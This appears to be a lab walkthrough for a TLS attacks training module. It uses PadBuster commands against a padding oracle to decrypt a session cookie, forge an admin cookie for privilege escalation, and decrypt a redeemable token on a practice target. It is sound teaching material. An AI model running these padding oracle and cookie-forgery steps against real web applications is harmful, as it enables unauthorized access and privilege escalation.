# Skills Assessment

This skills assessment for the HTTPS/TLS Attacks module requires you to identify and exploit vulnerabilities in a given TLS configuration. You will need to utilize the knowledge gained from this module to:

1.  **Enumerate TLS Configuration:** Use tools like `testssl.sh` to thoroughly audit the target's TLS setup, including supported versions, cipher suites, certificates, and potential vulnerabilities.
2.  **Identify Weaknesses:** Pinpoint misconfigurations or vulnerable implementations (e.g., outdated TLS versions, weak cipher suites, susceptible to padding oracle attacks or Heartbleed).
3.  **Formulate an Attack Plan:** Based on identified weaknesses, devise a strategy to exploit the TLS vulnerabilities.
4.  **Execute Exploits:** Implement and execute the chosen attacks (e.g., using TLS-Breaker, `arpspoof`, `bettercap`) to achieve specific objectives, such as decrypting traffic or obtaining sensitive information.
5.  **Provide Recommendations:** Suggest appropriate countermeasures and best practices to remediate the identified vulnerabilities and enhance TLS security.

The overall goal is to demonstrate your ability to assess, exploit, and secure TLS configurations in a practical scenario. Good luck!

## Walkthrough

After spawning the target machine, you need to visit its root webpage and log in with the credentials `htb-stdnt:Academy_student!`.

Next, navigate to the `/admin` page by clicking on "Admin Area". Intercept the request with Burp Suite and send it to Repeater. You will notice that the "user" cookie is lower-case hex encoded.

When altering the cookie's value (e.g., to "invalid"), the response will return "Decryption failed". This error message indicates a Padding Oracle vulnerability. Use `PadBuster` on the Padding Oracle at the `/admin` endpoint to decrypt the cookie. The block size needs to be set to 16, the encoding to lowercase hexadecimal (i.e., `1` in PadBuster), and the error message to "Decryption failed". The decrypted value of the "user" cookie should be `{"user": "htb-stdnt", "role": "user"}`.

```bash
padbuster http://STMIP:STMPO/admin "963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" 16 -encoding 1 -cookies "user=963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" -error "Decryption failed"
```

Subsequently, encrypt the cookie with the value `{"user": "admin", "role": "admin"}` to attempt privilege escalation. This will provide you with an encrypted cookie value.

```bash
padbuster http://STMIP:STMPO/admin "963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" 16 -encoding 1 -cookies "user=963882e67113e76587b1e0c129ab8485e072a5f7af71c8c7858473b917772acd212fedc54303f1efd41da3ca27360cddc699851cdb81466afaf6f7d112d964ed" -error "Decryption failed" -plaintext '{"user": "admin", "role": "admin"}'
```

Use the newly encrypted cookie in the `/admin` endpoint. You will then attain a token.

Afterward, navigate to `/token` by clicking on "Redeem Token". Supply the previously attained token, making sure Burp Suite is intercepting the request to send it to Repeater.

When an incorrect/invalid token value is supplied, the response will return an error message stating "Decryption Error. Invalid Token!". Use `PadBuster` to decrypt the token value. Unlike before, the block size needs to be set to 8, and the `-post` option must be used (since it is a POST request).

```bash
padbuster http://STMIP:STMPO/token "0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3" 8 -encoding 1 -post "token=0e0d74356da663454101d805584b6190eb57e7e30d9817ecfbf7973c9ab5df54f46a586de5c8693203896946088172a3" -error "Decryption Error. Invalid Token!"
```
